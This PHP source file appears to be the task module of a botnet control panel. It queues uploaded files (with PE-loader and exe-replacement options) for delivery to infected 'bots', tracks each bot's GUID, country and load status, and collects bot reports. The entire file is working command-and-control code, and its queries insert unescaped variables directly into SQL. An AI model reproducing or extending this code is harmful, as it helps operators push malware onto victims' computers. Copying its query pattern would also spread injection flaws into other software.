<?
	if (!defined('IN_BNCP')) exit;
	include_once ROOT_PATH."/mod/geo.php";
	
## get tasks from db
	function GetTasks()
	{
		global $db;
		$sql = "SELECT tskId,tskDate,tskComment,fName,fType,tskState FROM tasks_t, files_t WHERE fk_file_id=fId ORDER BY tskId";
		$res = $db->query($sql);
		if( $db->affected_rows && is_object($res) )
		{
			$RES = array();
			while( $task = $res->fetch_array() )
			{
				$RES[] = $task;
			}
			return $RES;
		}
		return 0;
	}
##	
	function AddTask($file, $note, $peload, $replexe, $isUnlimit)
	{
		global $db;
		$sql = "INSERT INTO tasks_t VALUES(NULL, CONVERT_TZ(now(),@@time_zone,'+0:00'), '$note', $file, $peload, $replexe, '1', $isUnlimit)";
		$db->query($sql);
		return $db->insert_id;
	}
##
	function TaskAddBot($tid, $bid)
	{
		global $db;
		$sql = "INSERT INTO loads_t VALUES(NULL, $bid, 0, $tid, '')";
		$db->query($sql);
		return $db->affected_rows;
	}
## get info about 1 task
	function GetTask($tid)
	{
		global $db;
		$sql = "SELECT tskId,tskDate,tskComment,fName,fType,tskPeLoader,tskReplExe,fMd5,fId 
				FROM tasks_t, files_t WHERE fk_file_id=fId AND tskId=$tid";
		$res = $db->query($sql);
		if( $db->affected_rows && is_object($res) )
		{
			return $res->fetch_array();
		}
		return 0;
	}
## get count of bots for task
	function TaskGetBotCount($tid, $status=0)
	{
		global $db;
		if( $status ) $where = "AND upStatus=$status";
		$sql = "SELECT count(*) FROM loads_t WHERE fk_task_id=$tid $where";
		$res = $db->query($sql);
		if( $db->affected_rows && is_object($res) )
		{
			list($count) = $res->fetch_array();
			return $count;
		}
		return 0;
	}
## get bots info for task
	function TaskGetBotInfo($tid)
	{
		global $db;
		$sql = "SELECT id_bot, guid_bot, upStatus, name_country, upId, upStartTime FROM loads_t, bots_t, city_t, country_t 
				WHERE fk_bot_id=id_bot AND fk_task_id=$tid 
				AND bots_t.fk_city_bot = city_t.id_city AND country_t.id_country = city_t.fk_country_city";

		$res = $db->query($sql);
		$countries = GetCountries();
		if( $db->affected_rows && is_object($res) )
		{
			$RES = array();
			while( $row = $res->fetch_array() )
			{
				$cname = $row['name_country'];
				$cc = $countries[$cname];
				$row['CCODE'] = $cc;
				$RES[] = $row;
			}
			return $RES;
		}
		return 0;
	}
##
	function TaskChangeState($tid, $ps)
	{
		global $db;
		$sql = "UPDATE tasks_t SET tskState='$ps' WHERE tskId=$tid";
		$db->query($sql);
		return $db->affected_rows;
	}
## 
	function TaskGetReports($tid)
	{
		global $db;
		$sql = "SELECT data_rep, date_rep, guid_bot FROM  tasks_t,loads_t, loads_rep_t, bots_t 
				WHERE tskId=fk_task_id AND fk_load_id=upId AND fk_bot_id=id_bot  AND tskId=$tid";
		$res = $db->query($sql);
		if( $db->affected_rows && is_object($res) )
		{
			$reports = array();
			while( $row = $res->fetch_array() )
			{
				$reports[] = $row;
			}
			return $reports;
		}
		return 0;
	}
## 
	function LoadGetReports($lid)
	{
		global $db;
		$sql = "SELECT data_rep, date_rep, guid_bot FROM  tasks_t,loads_t, loads_rep_t, bots_t 
				WHERE tskId=fk_task_id AND fk_load_id=upId AND fk_bot_id=id_bot AND upId=$lid ORDER BY id_rep";
				
		$res = $db->query($sql);
		if( $db->affected_rows && is_object($res) )
		{
			$reports = array();
			while( $row = $res->fetch_array() )
			{
				$reports[] = $row;
			}
			return $reports;
		}
		return 0;	
	}
## 
	function DeleteTask($tid)
	{
		global $db;	
		DeleteLoads($tid);
		$sql = "DELETE FROM tasks_t WHERE tskId=$tid LIMIT 1";
		$db->query($sql);
		return $db->affected_rows;
	}
##
	function DeleteLoads($tid)
	{
		global $db;	
		$sql = "SELECT upId FROM loads_t WHERE fk_task_id=$tid";
		$res = $db->query($sql);
		if( $db->affected_rows && is_object($res) )
		{
			while( list($lid) = $res->fetch_array() )	DeleteReports($lid);
		}		
		
		$sql = "DELETE FROM loads_t WHERE fk_task_id=$tid";
		$db->query($sql);
		return $db->affected_rows;
	}
## 
	function DeleteReports($lid)
	{
		global $db;
		$sql = "DELETE FROM loads_rep_t WHERE fk_load_id=$lid";
		$db->query($sql);
		return $db->affected_rows;
	}
?>